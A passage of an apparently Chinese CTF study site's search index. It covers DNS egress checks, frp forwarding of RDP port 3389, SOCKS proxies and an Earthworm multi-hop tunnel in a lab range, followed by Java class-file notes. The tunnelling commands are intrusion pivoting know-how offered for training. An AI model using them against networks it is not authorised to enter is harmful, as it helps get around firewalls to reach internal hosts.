<p></p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article2/index.html#4dns","title":"4.DNS\u534f\u8bae\u63a2\u6d4b\u51fa\u7f51","text":"<p>\u5728\u8fdb\u884cDNS\u8fde\u901a\u6027\u68c0\u6d4b\u65f6\uff0c\u5e38\u7528\u7684\u547d\u4ee4\u4e3anslookup\u548cdig.</p> <p>nslookup\u662fWindows\u64cd\u4f5c\u7cfb\u7edf\u81ea\u5e26\u7684DNS\u63a2\u6d4b\u547d\u4ee4\u3002\u5176\u7528\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>nslookup www.baidu.com       //vps-ip    \n#nslookup domain [dns-server]  \u5982\u679c\u6ca1\u6709\u6307\u5b9adns\u670d\u52a1\u5668\uff0c\u5c31\u91c7\u7528\u7cfb\u7edf\u9ed8\u8ba4\u7684dns\u670d\u52a1\u5668\u3002\n</code></pre> <p></p> <p>dig\u662fLinux\u9ed8\u8ba4\u81ea\u5e26\u7684DNS\u63a2\u6d4b\u547d\u4ee4\u3002\u5176\u7528\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>dig @8.8.8.8 www.baidu.com   //\u8fd9\u91cc\u6307\u5b9aDNS\u670d\u52a1\u5668\uff0c8.8.8.8\u662fGoogle\u7684DNS\u670d\u52a1\u5668\u3002\u8fd4\u56de\u54cd\u5e94\u7ed3\u679c\uff0c\u8bc1\u660e\u51fa\u7f51\u6210\u529f\n</code></pre> <p></p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article3/index.html","title":"\u5185\u7f51\u5e38\u89c4\u96a7\u9053\u5229\u7528\u65b9\u6cd5","text":""},{"location":"CTF/Intranet_security/Tunnel_technology/article3/index.html#1","title":"1.\u7aef\u53e3\u8f6c\u53d1","text":"<p>\u4ecb\u7ecd\u6700\u5e38\u89c1\u7684frp\u7aef\u53e3\u8f6c\u53d1\u5de5\u5177\u7684\u4f7f\u7528\u573a\u666f\uff0cfrp\u5de5\u5177\u662f\u4e00\u4e2a\u7ea2\u961f\u4eba\u5458\u5728\u5185\u7f51\u6e17\u900f\u6d4b\u8bd5\u4e2d\u6700\u5178\u578b\u7684\u7aef\u53e3\u8f6c\u53d1\u5de5\u5177\uff0cfrp\u5de5\u5177\u53ef\u5206\u4e3aWindows\u548cLinux\u4e24\u4e2a\u7248\u672c\uff0c\u8fd9\u91cc\u4ee5frp\u5de5\u5177\u4e3a\u4f8b\uff0c\u4ee5\u8f6c\u53d13389\u7aef\u53e3\u4e3a\u76ee\u7684\u6f14\u793a\u7aef\u53e3\u8f6c\u53d1\u529f\u80fd\u3002</p> <p></p> <p>\u672c\u6b21\u7684\u8bd5\u9a8c\u76ee\u7684\u662f\u5728\u53e6\u4e00\u53f0pc\u4e0a\u8fde\u63a5\u5185\u7f51\u670d\u52a1\u5668\u76843389\u7aef\u53e3\uff0c\u5728\u73af\u5883\u642d\u5efa\u9636\u6bb5\u6211\u4eec\u5df2\u7ecf\u5c06\u9632\u706b\u5899\u6253\u5f00\uff0c\u800c\u4e14\u7531\u4e8epc\u548c\u5185\u7f51\u670d\u52a1\u5668\u4e0d\u5728\u540c\u4e00\u7f51\u6bb5\uff0c\u6240\u4ee5\u662f\u65e0\u6cd5\u76f4\u63a5\u8fde3389\u7684\uff0c\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5185\u7f51\u670d\u52a1\u5668\u76843389\u8f6c\u53d1\u51fa\u6765\uff0c\u8f6c\u53d1\u5230\u516c\u7f51\u670d\u52a1\u5668\u7684\u4e00\u4e2a\u7aef\u53e3\u4e0a\uff0c\u8fd9\u6837\u6211\u4eec\u901a\u8fc7\u8fde\u63a5\u516c\u7f51\u670d\u52a1\u5668\u7684\u67d0\u4e2a\u7aef\u53e3\uff0c\u5c31\u53ef\u4ee5\u8bbf\u95ee\u5185\u7f51\u670d\u52a1\u5668\u76843389\u4e86\u3002</p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article3/index.html#1_1","title":"1.\u914d\u7f6e\u670d\u52a1\u7aef","text":"<p>\u7f16\u8f91frps.ini</p> <pre><code>[common]\nbind_port = 7000\n</code></pre> <p>\u6253\u5f00\u6587\u4ef6\u9ed8\u8ba4\u5c31\u662f\u8fd9\u4e2a\uff0c\u4e0d\u7528\u52a8\uff0c\u4fdd\u6301\u8fd9\u6837\u5c31\u884c\uff0c\u8fd9\u662f\u914d\u7f6e\u670d\u52a1\u7aef\u7684\u7aef\u53e3\uff0c\u7136\u540e\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u542f\u52a8\u670d\u52a1\u7aef</p> <pre><code>./frps -c ./frps.ini\n</code></pre> <p></p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article3/index.html#2","title":"2.\u914d\u7f6e\u5ba2\u6237\u7aef","text":"<pre><code>[common]\nserver_addr = 8.x.x.x     #\u670d\u52a1\u7aefip\uff0c\u4e5f\u5c31\u662f\u516c\u7f51\u670d\u52a1\u5668ip\nserver_port = 7000          #\u670d\u52a1\u5668\u7aef\u53e3\n\n[ssh]                       #\u8fd9\u4e2a\u662f\u8282\u70b9\u540d\u79f0\uff0c\u53ef\u4ee5\u968f\u4fbf\u5199\ntype = tcp                  #\u901a\u4fe1\u534f\u8bae\nlocal_ip = 127.0.0.1        #\u672c\u5730\u5730\u5740\nlocal_port = 3389           #\u8981\u8f6c\u53d1\u7684\u7aef\u53e3\nremote_port = 6000          #\u8981\u8f6c\u53d1\u5230\u7684\u8fdc\u7a0b\u7aef\u53e3\n</code></pre> <p>\u914d\u7f6e\u5b8c\u6210\u540e\uff0c\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u542f\u52a8\u5ba2\u6237\u7aef</p> <pre><code>frpc.exe -c frpc.ini\n</code></pre> <p></p> <p>\u968f\u540e\u5c31\u80fd\u770b\u5230\u670d\u52a1\u7aef\u663e\u793a\u6709\u65b0\u7684\u5ba2\u6237\u7aef\u8fde\u8fdb\u6765\u4e86</p> <p></p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article3/index.html#3","title":"3.\u8fde\u63a5\u8fdc\u7a0b\u684c\u9762","text":""},{"location":"CTF/Intranet_security/Tunnel_technology/article3/index.html#2socks","title":"2.Socks\u96a7\u9053\u4ee3\u7406","text":"<p>Socks\u662fSocket Secure\u7684\u7f29\u5199\uff0c\u5176\u662f\u4e00\u79cd\u5de5\u4f5c\u5728OSI\u4e03\u5c42\u6a21\u578b\u4e2d\u7684\u7b2c\u4e94\u5c42\u7f51\u7edc\u4f1a\u8bdd\u5c42\u534f\u8bae\uff0cSocks\u4e3b\u8981\u7684\u4f5c\u7528\u662f\u4ee3\u8868\u5ba2\u6237\u7aef\u5c06\u4efb\u4f55\u534f\u8bae\u6216\u8005\u4efb\u4f55\u7a0b\u5e8f\u4ea7\u751f\u7684\u4efb\u4f55\u7c7b\u578b\u7684\u6d41\u91cf\u8def\u7531\u5230\u670d\u52a1\u5668\u4e0a\uff0c\u4ee5\u6b64\u6765\u5c06\u672c\u5730\u548c\u8fdc\u7aef\u4e24\u4e2a\u7cfb\u7edf\u8fde\u63a5\u8d77\u6765\u3002</p> <p>\u7531\u4e8eSocks\u5176\u5904\u4e8e\u7b2c\u4e03\u5c42\u548c\u7b2c\u56db\u5c42\u6a21\u578b\u4e4b\u95f4\uff0c\u56e0\u6b64socks\u53ef\u4ee5\u652f\u6301HTTP\u3001HTTPS\u3001FTP\u3001SSH\u3001FTP\u7b49\u591a\u79cd\u534f\u8bae\uff0cSocks\u4ece\u7248\u672c\u4e0a\u6765\u8bb2\uff0c\u53c8\u53ef\u5206\u4e3asocks4\u548csocks5\u8fd9\u4e24\u79cd\u7248\u672c\uff0c\u76ee\u524dsocks\u534f\u8bae\u6700\u65b0\u7248\u672c\u4e3asocks5\uff0csocks4\u548csocks5\u8fd9\u4e24\u8005\u7248\u672c\u6700\u4e3b\u8981\u7684\u533a\u522b\u662fsocks4\u4ec5\u652f\u6301TCP\u4ee3\u7406\uff0c\u4e0d\u652f\u6301UDP\u4ee3\u7406\u4ee5\u53ca\u5404\u79cd\u9a8c\u8bc1\u534f\u8bae\uff0csocks5\u4e0d\u4ec5\u652f\u6301TCP/UDP\u4ee3\u7406\u4ee5\u53ca\u5404\u79cd\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\u7684\u540c\u65f6\uff0c\u8fd8\u4f1a\u901a\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u5efa\u7acb\u5b8c\u6574\u7684TCP \u8fde\u63a5\uff0c\u5e76\u4f7f\u7528Secure Shell (SSH) \u52a0\u5bc6\u96a7\u9053\u7684\u65b9\u6cd5\u6765\u4e2d\u7ee7\u6d41\u91cf\uff0c\u5728\u7ea2\u84dd\u653b\u9632\u5bf9\u6297\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u5229\u7528Socks5\u6765\u5efa\u7acb\u901a\u4fe1\u96a7\u9053\u4ee5\u6b64\u6765\u8bbf\u95ee\u8fdc\u7a0b\u6838\u5fc3\u9776\u6807\u7cfb\u7edf\u4e2d\u7684\u5185\u90e8\u7f51\u7edc\u3002</p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article3/index.html#1socks","title":"1.socks\u5e38\u89c1\u5229\u7528\u573a\u666f","text":"<p>\u5047\u8bbe\u5728\u76ee\u6807\u5185\u7f51\u4e2d\u5df2\u7ecf\u83b7\u53d6\u4e86\u4e00\u53f0\u53ef\u6267\u4efb\u610f\u884c\u547d\u4ee4\u6743\u9650\u7684\u4e3b\u673a\u540e\uff0c\u9700\u8981\u6765\u5bf9\u5176\u4e3b\u673a\u6240\u5c5e\u7684\u533a\u57df\u4ee5\u53ca\u5b89\u5168\u7b56\u7565\u8fdb\u884c\u5224\u65ad\u63a2\u6d4b\u662f\u5426\u53ef\u4ee5\u5efa\u7acbsocks\u8fde\u63a5</p> \u76ee\u6807\u4f4d\u7f6e \u573a\u666f\u63cf\u8ff0 \u5185\u7f51 \u9632\u706b\u5899\u672a\u5bf9\u51fa\u53e3\u6d41\u91cf\u53ca\u7aef\u53e3\u505a\u4efb\u4f55\u65b9\u9762\u7684\u5b89\u5168\u7b56\u7565\uff0c\u5185\u7f51\u4e2d\u7684\u670d\u52a1\u5668\u53ef\u4efb\u610f\u8bbf\u95ee\u5916\u90e8\u7f51\u7edc\uff0c\u4e0d\u53d7\u5b89\u5168\u7b56\u7565\u9650\u5236\u3002 \u5185\u7f51 \u9632\u706b\u5899\u53ea\u914d\u7f6e\u4e86\u7279\u5b9a\u7684\u5165\u7ad9\u89c4\u5219\uff0c\u4ec5\u5141\u8bb8\u7279\u5b9a\u4e1a\u52a1\u7684\u7aef\u53e3\u8fdb\u884c\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a80\u3001443\uff09 \u5185\u7f51 \u9632\u706b\u5899\u90fd\u914d\u7f6e\u4e86\u7279\u5b9a\u7684\u51fa\u5165\u7ad9\u89c4\u5219\uff0c\u4ec5\u5f00\u653e\u4e86\u7279\u5b9a\u7684\u7aef\u53e3\uff08\u4f8b\u5982\uff1a80\u3001443\uff09"},{"location":"CTF/Intranet_security/Tunnel_technology/article3/index.html#2socks_1","title":"2.socks\u5168\u5c40\u4ee3\u7406\u8f6f\u4ef6","text":"<p>\uff081\uff09Proxifier</p> <p>\uff082\uff09SocksCap64</p> <p>\uff083\uff09Proxychains</p>"},{"location":"CTF/Intranet_security/Tunnel_technology/article4/index.html","title":"\u901a\u8fc7Earthworm(EW)\u8fdb\u884c\u96a7\u9053\u7a7f\u900f","text":"<p>\u5728\u8fdb\u884c\u591a\u5c42\u7f51\u6bb5\u6e17\u900f\u65f6\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u9047\u5230\u5404\u79cd\u4ee3\u7406\u96a7\u9053\u95ee\u9898\uff0c\u4ec5\u9760\u4f7f\u7528\u7aef\u53e3\u8f6c\u53d1\u65e0\u6cd5\u5b8c\u6210\uff0c\u53ef\u4ee5\u5229\u7528Socks\u534f\u8bae\u5efa\u7acb\u96a7\u9053\u8fdb\u884c\u8fde\u63a5\uff0cSocks\u662f\u4ee3\u7406\u670d\u52a1\u53ef\u4ee5\u8bf4\u662flcx\u7aef\u53e3\u8f6c\u53d1\u5de5\u5177\u7684\u5347\u7ea7\u7248\uff0c\u6709\u4e24\u79cd\u534f\u8bae\uff0c\u5206\u522b\u662fSocks 4\u548cSocks 5\u3002Socks 4\u53ea\u652f\u6301TCP\uff0cSocks 5\u652f\u6301TCP/UDP\uff0c\u6838\u5fc3\u529f\u80fd\u662f\u5e2e\u52a9\u4ed6\u4eba\u901a\u8fc7socks\u8bbf\u95ee\u7f51\u7edc\u3002\u5728\u4e3b\u673a\u4e0a\u914d\u7f6eSocks\u534f\u8bae\u4ee3\u7406\u670d\u52a1\uff0c\u8bbf\u95ee\u7f51\u7ad9\u65f6Socks\u5145\u5f53\u4e86\u4e2d\u95f4\u4eba\u7684\u89d2\u8272\uff0c\u5206\u522b\u4e0e\u53cc\u65b9\uff08B/S\uff09\u8fdb\u884c\u901a\u4fe1\uff0c\u7136\u540e\u5c06\u83b7\u5f97\u7684\u7ed3\u679c\u901a\u77e5\u5bf9\u65b9\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7Socks\u5ba2\u6237\u7aef\u8fde\u63a5Socks\u670d\u52a1\uff0c\u8fdb\u800c\u5b9e\u73b0\u8df3\u677f\u653b\u51fb\uff0cEW\u5de5\u5177\u4f7f\u7528\u5177\u4f53\u53c2\u6570\u5982\u8868\u6240\u793a\u3002</p> \u53c2\u6570 \u4f5c\u7528 Ssocksd \u6b63\u5411\u4ee3\u7406                  (Simple Socks Daemon) Rcsock \u53cd\u5411\u4ee3\u7406\u5ba2\u6237\u7aef         (Reverse Client Socks) Rssocks \u53cd\u5411\u4ee3\u7406\u670d\u52a1\u7aef             (Reverse Server Socks) Lcx_slave \u4e00\u4fa7\u901a\u8fc7\u53cd\u5f39\u65b9\u5f0f\u8fde\u63a5\u4ee3\u7406\u8bf7\u6c42\u65b9\uff0c\u53e6\u4e00\u4fa7\u8fde\u63a5\u4ee3\u7406\u63d0\u4f9b\u4e3b\u673a   (Link Connect Slave) Lcx_tran \u901a\u8fc7\u76d1\u542c\u672c\u5730\u7aef\u53e3\u63a5\u6536\u4ee3\u7406\u8bf7\u6c42\uff0c\u5e76\u8f6c\u53d1\u7ed9\u4ee3\u7406\u63d0\u4f9b\u4e3b\u673a          (Link Connect Transfer) Lcx_listen \u901a\u8fc7\u76d1\u542c\u672c\u5730\u7aef\u53e3\u63a5\u6536\u6570\u636e\uff0c\u5e76\u5c06\u5176\u8f6c\u4ea4\u7ed9\u76ee\u6807\u7f51\u7edc\u4f1a\u8fde\u7684\u4ee3\u7406\u63d0\u4f9b\u4e3b\u673a        (Link Connect Listen)"},{"location":"CTF/Intranet_security/Tunnel_technology/article4/index.html#-7","title":"\u6848\u4f8b - \u7ea2\u65e5\u9776\u573a7","text":""},{"location":"CTF/Intranet_security/Tunnel_technology/article4/index.html#_1","title":"\u7f51\u7edc\u73af\u5883","text":"\u673a\u5668 ip \u653b\u51fb\u673a(lcx_listen) 192.168.111.128 Windows \u670d\u52a1\u5668 (ssocksd) 192.168.52.30 / 192.168.93.20 DMZ\u533a\u57df\u7684Ubuntu 18(Lcx_slave) 192.168.111.133 / 192.168.52.10"},{"location":"CTF/Intranet_security/Tunnel_technology/article4/index.html#_2","title":"\u96a7\u9053\u7a7f\u900f\u6d41\u7a0b","text":""},{"location":"CTF/Intranet_security/Tunnel_technology/article4/index.html#1-192168111128","title":"1.\u653b\u51fb\u673a (192.168.111.128)","text":"<pre><code>./ew_for_linux64 -s lcx_listen -l 1090 -e 1235\n</code></pre> <ul> <li>\u4f5c\u7528\uff1a\u5728\u653b\u51fb\u673a\u4e0a\u542f\u52a8\u4e00\u4e2a\u76d1\u542c\u7aef\u53e3(1090)\u7684\u670d\u52a1\uff0c\u7b49\u5f85\u6765\u81ea\u5176\u4ed6\u4e3b\u673a\u7684\u4ee3\u7406\u8bf7\u6c42\u3002\u63a5\u6536\u5230\u7684\u8bf7\u6c42\u5c06\u4f1a\u8f6c\u53d1\u5230\u6307\u5b9a\u7684\u76ee\u6807\u5730\u5740\uff08192.168.111.128:1235\uff09\u3002</li> <li>\u540e\u679c\uff1a\u653b\u51fb\u673a\u5c06\u6210\u4e3a\u4e00\u4e2a\u5165\u53e3\u70b9\uff0c\u4efb\u4f55\u901a\u8fc71090\u7aef\u53e3\u53d1\u9001\u7684\u8bf7\u6c42\u90fd\u5c06\u88ab\u8f6c\u53d1\u5230192.168.111.128\u76841235\u7aef\u53e3\uff0c\u5efa\u7acb\u4ee3\u7406\u901a\u9053\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Tunnel_technology/article4/index.html#2windows-1921685230-1921689320","title":"2.Windows \u670d\u52a1\u5668 (192.168.52.30, 192.168.93.20)","text":"<pre><code>ew_for_Win.exe -s ssocksd -l 999\n</code></pre> <ul> <li>\u4f5c\u7528\uff1a\u5728Windows\u670d\u52a1\u5668\u4e0a\u542f\u52a8\u4e00\u4e2aSOCKS\u4ee3\u7406\u670d\u52a1\uff0c\u76d1\u542c999\u7aef\u53e3\u3002</li> <li>\u540e\u679c\uff1a\u4efb\u4f55\u8fde\u63a5\u5230\u8be5Windows\u670d\u52a1\u5668\u7684999\u7aef\u53e3\u7684\u8bf7\u6c42\u5c06\u901a\u8fc7\u6b64SOCKS\u4ee3\u7406\u8fdb\u884c\u5904\u7406\u3002\u8fd9\u4f7f\u5f97\u5176\u4ed6\u4e3b\u673a\u53ef\u4ee5\u901a\u8fc7\u8be5\u4ee3\u7406\u8bbf\u95ee\u7f51\u7edc\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Tunnel_technology/article4/index.html#3dmzubuntu-18-192168111133-1921685210","title":"3.DMZ\u533a\u57df\u7684Ubuntu 18 (192.168.111.133, 192.168.52.10)","text":"<pre><code>./ew_for_linux64 -s lcx_slave -d 192.168.111.128 -e 1235 -f 192.168.52.30 -g 999\n</code></pre> <ul> <li>\u4f5c\u7528\uff1a\u5728DMZ\u533a\u57df\u7684Ubuntu\u4e3b\u673a\u4e0a\u542f\u52a8\u4e00\u4e2a\u4ee3\u7406\u8fde\u63a5\uff0c\u5c06\u6765\u81ea192.168.52.30\u7684999\u7aef\u53e3\u7684\u8bf7\u6c42\u8f6c\u53d1\u5230\u653b\u51fb\u673a\u76841235\u7aef\u53e3\u3002</li> <li>\u540e\u679c\uff1a\u8be5Ubuntu\u4e3b\u673a\u4f1a\u5c06\u8fde\u63a5\u5230\u5176999\u7aef\u53e3\u7684\u8bf7\u6c42\u8f6c\u53d1\u81f3\u653b\u51fb\u673a\u76841235\u7aef\u53e3\uff0c\u5b8c\u6210\u4ee3\u7406\u94fe\u7684\u642d\u5efa\uff0c\u4f7f\u5f97\u653b\u51fb\u673a\u53ef\u4ee5\u901a\u8fc7Ubuntu\u4e3b\u673a\u4e0eWindows\u670d\u52a1\u5668\u7684SOCKS\u4ee3\u7406\u8fdb\u884c\u901a\u4fe1\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Tunnel_technology/article4/index.html#4proxychains","title":"4.\u7136\u540e\u653b\u51fb\u673a\u4e0a\u914d\u7f6eproxychains","text":"<p>\u6b64\u65f6\uff0c\u5c31\u53ef\u4ee5\u8bbe\u7f6eproxychains\u7b49\u4ee3\u7406\u5de5\u5177\uff0c\u901a\u8fc7\u8bbf\u95ee\u653b\u51fb\u673a\u76841090\u7aef\u53e3\u6765\u4f7f\u7528\u67b6\u8bbe\u5728\u7b2c\u4e8c\u5c42\u7f51\u7edcWindows\u4e3b\u673a\u4e0a\u7684socks\u4ee3\u7406\u670d\u52a1\uff0c\u6765\u8fdb\u5165\u7b2c\u4e09\u5c42\u7f51\u7edc\u4e86\u3002</p>"},{"location":"CTF/Java_Security/index.html","title":"Java_Security","text":"<ul> <li>Class\u6587\u4ef6\u7ed3\u6784</li> <li>JVM\u57fa\u7840#1 JVM\u7684\u5de5\u4f5c\u6d41\u7a0b</li> <li>JVM\u57fa\u7840#2 JVM\u7684\u5185\u5b58\u5206\u533a</li> <li>JVM\u57fa\u7840#3 \u4e00\u4e2a\u5bf9\u8c61\u7684\u521b\u5efa\u8fc7\u7a0b</li> <li>JVM\u4e2d\u4ee3\u7801\u7684\u6267\u884c\u8fc7\u7a0b</li> <li>Java Agent</li> <li>JNI</li> </ul>"},{"location":"CTF/Java_Security/Article1/index.html","title":"Index","text":"<p>\u6211\u4eec\u6240\u7f16\u5199\u7684\u6bcf\u4e00\u884c\u4ee3\u7801\uff0c\u8981\u5728\u673a\u5668\u4e0a\u8fd0\u884c\u6700\u7ec8\u90fd\u9700\u8981\u7f16\u8bd1\u6210\u4e8c\u8fdb\u5236\u7684\u673a\u5668\u7801 CPU \u624d\u80fd\u8bc6\u522b\u3002\u4f46\u662f\u7531\u4e8e\u865a\u62df\u673a\u7684\u5b58\u5728\uff0c\u5c4f\u853d\u4e86\u64cd\u4f5c\u7cfb\u7edf\u4e0e CPU \u6307\u4ee4\u96c6\u7684\u5dee\u5f02\u6027\uff0c\u7c7b\u4f3c\u4e8e Java \u8fd9\u79cd\u5efa\u7acb\u5728\u865a\u62df\u673a\u4e4b\u4e0a\u7684\u7f16\u7a0b\u8bed\u8a00\u901a\u5e38\u4f1a\u7f16\u8bd1\u6210\u4e00\u79cd\u4e2d\u95f4\u683c\u5f0f\u7684\u6587\u4ef6Class\u6587\u4ef6\u6765\u8fdb\u884c\u5b58\u50a8\u3002</p>"},{"location":"CTF/Java_Security/Article1/index.html#_1","title":"\u4e00.\u8bed\u8a00\u65e0\u5173\u6027","text":"<p>Java \u865a\u62df\u673a\u7684\u8bbe\u8ba1\u8005\u5728\u8bbe\u8ba1\u4e4b\u521d\u5c31\u8003\u8651\u5e76\u5b9e\u73b0\u4e86\u5176\u5b83\u8bed\u8a00\u5728 Java \u865a\u62df\u673a\u4e0a\u8fd0\u884c\u7684\u53ef\u80fd\u6027\u3002\u6240\u4ee5\u5e76\u4e0d\u662f\u53ea\u6709 Java \u8bed\u8a00\u80fd\u591f\u8dd1\u5728 Java \u865a\u62df\u673a\u4e0a\uff0c\u65f6\u81f3\u4eca\u65e5\u8bf8\u5982 Kotlin\u3001Groovy\u3001Jython\u3001JRuby \u7b49\u4e00\u5927\u6279 JVM \u8bed\u8a00\u90fd\u80fd\u591f\u5728 Java \u865a\u62df\u673a\u4e0a\u8fd0\u884c\u3002\u5b83\u4eec\u548c Java \u8bed\u8a00\u4e00\u6837\u90fd\u4f1a\u88ab\u7f16\u8bd1\u5668\u7f16\u8bd1\u6210\u5b57\u8282\u7801\u6587\u4ef6\uff0c\u7136\u540e\u7531\u865a\u62df\u673a\u6765\u6267\u884c\u3002<code>\u6240\u4ee5\u8bf4\u7c7b\u6587\u4ef6\uff08\u5b57\u8282\u7801\u6587\u4ef6\uff09\u5177\u6709\u8bed\u8a00\u65e0\u5173\u6027\u3002</code></p> <p></p>"},{"location":"CTF/Java_Security/Article1/index.html#class","title":"\u4e8c. Class \u6587\u4ef6\u7ed3\u6784","text":"<p>Class \u6587\u4ef6\u662f\u4e00\u7ec4\u4ee5 8 \u4f4d\u5b57\u8282\u4e3a\u57fa\u7840\u5355\u4f4d\u7684\u4e8c\u8fdb\u5236\u6d41\uff0c\u5404\u4e2a\u6570\u636e\u4e25\u683c\u6309\u7167\u987a\u5e8f\u7d27\u51d1\u7684\u6392\u5217\u5728 Class \u6587\u4ef6\u4e2d\uff0c\u4e2d\u95f4\u65e0\u4efb\u4f55\u5206\u9694\u7b26\uff0c\u8fd9\u4f7f\u5f97\u6574\u4e2a Class \u6587\u4ef6\u4e2d\u5b58\u50a8\u7684\u5185\u5bb9\u51e0\u4e4e\u5168\u90e8\u90fd\u662f\u7a0b\u5e8f\u8fd0\u884c\u7684\u5fc5\u8981\u6570\u636e\uff0c\u6ca1\u6709\u7a7a\u9699\u5b58\u5728\u3002\u5f53\u9047\u5230\u9700\u8981\u5360\u7528 8 \u4f4d\u5b57\u8282\u4ee5\u4e0a\u7a7a\u95f4\u7684\u6570\u636e\u9879\u65f6\uff0c\u4f1a\u6309\u7167\u9ad8\u4f4d\u5728\u524d\u7684\u65b9\u5f0f\u5206\u5272\u6210\u82e5\u5e72\u4e2a 8 \u4f4d\u5b57\u8282\u8fdb\u884c\u5b58\u50a8\u3002</p> <p>Java \u865a\u62df\u673a\u89c4\u8303\u89c4\u5b9a Class \u6587\u4ef6\u683c\u5f0f\u91c7\u7528\u4e00\u79cd\u7c7b\u4f3c\u4e0e C \u8bed\u8a00\u7ed3\u6784\u4f53\u7684\u4f2a\u7ed3\u6784\u4f53\u6765\u5b58\u50a8\u6570\u636e\uff0c\u8fd9\u79cd\u4f2a\u7ed3\u6784\u4f53\u4e2d\u53ea\u6709\u4e24\u79cd\u6570\u636e\u7c7b\u578b\uff1a\u65e0\u7b26\u53f7\u6570\u548c\u8868\u3002</p> <ul> <li>\u65e0\u7b26\u53f7\u6570\u5c5e\u4e8e\u57fa\u672c\u7684\u6570\u636e\u7c7b\u578b\uff0c<code>\u4ee5 u1\u3001u2\u3001u4\u3001u8\u6765\u5206\u522b\u4ee3\u8868 1 \u4e2a\u5b57\u8282\u30012 \u4e2a\u5b57\u8282\u30014 \u4e2a\u5b57\u8282\u548c 8 \u4e2a\u5b57\u8282\u7684\u65e0\u7b26\u53f7\u6570</code>\uff0c\u65e0\u7b26\u53f7\u6570\u53ef\u4ee5\u7528\u6765\u63cf\u8ff0\u6570\u5b57\u3001\u7d22\u5f15\u5f15\u7528\u3001\u6570\u91cf\u503c\u6216\u8005\u6309\u7167 UTF-8 \u7f16\u7801\u7ed3\u6784\u6784\u6210\u7684\u5b57\u7b26\u4e32\u503c\u3002</li> <li>\u8868\u662f\u7531\u591a\u4e2a\u65e0\u7b26\u53f7\u6570\u6216\u8005\u5176\u4ed6\u8868\u4f5c\u4e3a\u6570\u636e\u9879\u6784\u6210\u7684\u590d\u5408\u6570\u636e\u7c7b\u578b\uff0c\u6240\u6709\u8868\u90fd\u4e60\u60ef\u6027\u5730\u4ee5\u300c_info\u300d\u7ed3\u5c3e\u3002\u8868\u7528\u4e8e\u63cf\u8ff0\u6709\u5c42\u6b21\u5173\u7cfb\u7684\u590d\u5408\u7ed3\u6784\u7684\u6570\u636e\uff0c\u6574\u4e2a Class \u6587\u4ef6\u5c31\u662f\u4e00\u5f20\u8868\uff0c\u5b83\u7531\u4e0b\u8868\u4e2d\u6240\u793a\u7684\u6570\u636e\u9879\u6784\u6210\u3002</li> </ul> <p></p> <p>Class \u6587\u4ef6\u4e2d\u5b58\u50a8\u7684\u5b57\u8282\u4e25\u683c\u6309\u7167\u4e0a\u8868\u4e2d\u7684\u987a\u5e8f\u7d27\u51d1\u7684\u6392\u5217\u5728\u4e00\u8d77\u3002\u54ea\u4e2a\u5b57\u8282\u4ee3\u8868\u4ec0\u4e48\u542b\u4e49\uff0c\u957f\u5ea6\u662f\u591a\u5c11\uff0c\u5148\u540e\u987a\u5e8f\u5982\u4f55\u90fd\u662f\u88ab\u4e25\u683c\u9650\u5236\u7684\uff0c\u4e0d\u5141\u8bb8\u6709\u4efb\u4f55\u6539\u53d8\u3002</p>"},{"location":"CTF/Java_Security/Article1/index.html#21testclass","title":"2.1Test\u7c7b\u4f5c\u4e3aClass\u6587\u4ef6\u89e3\u8bfb\u53c2\u8003","text":"<pre><code>public class Test {\n\n    private int m;\n\n    public int inc(){\n        return m + 1;\n    }\n}\n</code></pre> <p>javac\u7f16\u8bd1\u540e\u4f7f\u7528winhex\u6253\u5f00\u67e5\u770b\u4e8c\u8fdb\u5236\u4fe1\u606f\u3002</p> <p></p> <p>\u67e5\u770b\u5b57\u8282\u7801\u4fe1\u606f\uff1a\u4f7f\u7528javap -verbose\u5de5\u5177\u53ef\u4ee5\u53c2\u770b\u5f53\u524dClass\u6587\u4ef6\u7684\u5b57\u8282\u7801\u4fe1\u606f</p> <pre><code>PS C:\\Users\\86178\\Desktop\\project\\javaproject\\demo\\src&gt; javap -v .\\Test.class\nClassfile /C:/Users/86178/Desktop/project/javaproject/demo/src/Test.class\n  Last modified 2024-4-26; size 265 bytes\n  MD5 checksum 0d5efc4b65ae7eb6d64f84136ce58ff9\n  Compiled from \"Test.java\"\npublic class Test\n  minor version: 0\n  major version: 52\n  flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:\n   #1 = Methodref          #4.#15         // java/lang/Object.\"&lt;init&gt;\":()V\n   #2 = Fieldref           #3.#16         // Test.m:I\n   #3 = Class              #17            // Test\n   #4 = Class              #18            // java/lang/Object\n   #5 = Utf8               m\n   #6 = Utf8               I\n   #7 = Utf8               &lt;init&gt;\n   #8 = Utf8               ()V\n   #9 = Utf8               Code\n  #10 = Utf8               LineNumberTable\n  #11 = Utf8               inc\n  #12 = Utf8               ()I\n  #13 = Utf8               SourceFile\n  #14 = Utf8               Test.java\n  #15 = NameAndType        #7:#8          // \"&lt;init&gt;\":()V\n  #16 = NameAndType        #5:#6          // m:I\n  #17 = Utf8               Test\n  #18 = Utf8               java/lang/Object\n         5: iadd\n         6: ireturn\n      LineNumberTable:\n        line 6: 0\n}\nSourceFile: \"Test.java\"\nPS C:\\Users\\86178\\Desktop\\project\\javaproject\\demo\\src&gt;\n</code></pre>"},{"location":"CTF/Java_Security/Article1/index.html#22class","title":"2.2\u9b54\u6570\u4e0eClass \u6587\u4ef6\u7248\u672c","text":"<p>\u6bcf\u4e2a Class \u6587\u4ef6\u7684\u5934 4 \u4e2a\u5b57\u8282\u79f0\u4e3a\u9b54\u6570\uff08Magic 